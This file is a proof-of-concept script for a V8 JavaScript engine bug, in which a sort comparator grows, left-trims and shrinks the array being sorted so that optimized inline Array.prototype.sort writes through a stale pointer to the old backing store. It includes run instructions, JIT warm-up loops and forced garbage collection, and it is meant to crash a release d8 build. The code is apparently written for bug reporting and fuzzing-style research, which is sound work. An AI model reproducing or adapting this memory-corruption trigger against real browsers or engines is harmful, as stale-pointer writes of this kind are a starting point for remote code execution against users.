// No-flags PoC for the array_sort_cow_write stale-elements bug.
//
// Run:
//   V8=/path/to/v8
//   "$V8/out/x64.release/d8" pocs/20260416-array-sort-lefttrim-stale-elements-noflags.js
//
// Expected: release d8 segfaults during GC/scavenging after optimized inline
// Array.prototype.sort writes through a stale pre-left-trim FixedArray pointer.

let victim;
let did_mutate;

function makeLargeCapacityPackedSmiArray() {
  const a = [];
  for (let i = 0; i < 236; i++) {
    a.push(1000 + i);
  }

  // Leaves a PACKED_SMI array with length 16 but a large over-allocated
  // FixedArray backing store. Direct length assignment would right-trim.
  a.splice(16);
  return a;
}

function sortVictim(a) {
  did_mutate = false;
  victim = a;

  // A closure literal gives the sort reducer a statically-known comparefn in
  // natural tiering, matching the reducer's JSCreateClosure/CheckClosure path.
  victim.sort(function(a, b) {
    if (!did_mutate) {
      did_mutate = true;

      // No reallocation: the receiver already has enough backing capacity.
      for (let i = 0; i < 220; i++) {
        victim.push(2000 + i);
      }

      // Forces ElementsAccessor::RemoveElement(..., AT_START) to call
      // Heap::LeftTrimFixedArray because new_length > JSArray::kMaxCopyElements.
      victim.shift();

      // Restore the final inline-sort guard inputs. The receiver map stays
      // PACKED_SMI_ELEMENTS and the JSArray length is back to the original value.
      victim.length = 16;
    }
    return a - b;
  });

  return victim.length;
}

let r = 0;
for (let i = 0; i < 50000; i++) {
  r ^= sortVictim(makeLargeCapacityPackedSmiArray());
}
print("warm done " + r);
print(sortVictim(makeLargeCapacityPackedSmiArray()));

// Preserve post-optimization victims and force heap walking.
const roots = [];
for (let i = 0; i < 50000; i++) {
  const a = makeLargeCapacityPackedSmiArray();
  sortVictim(a);
  roots.push(a);
}
print("survived " + roots.length);
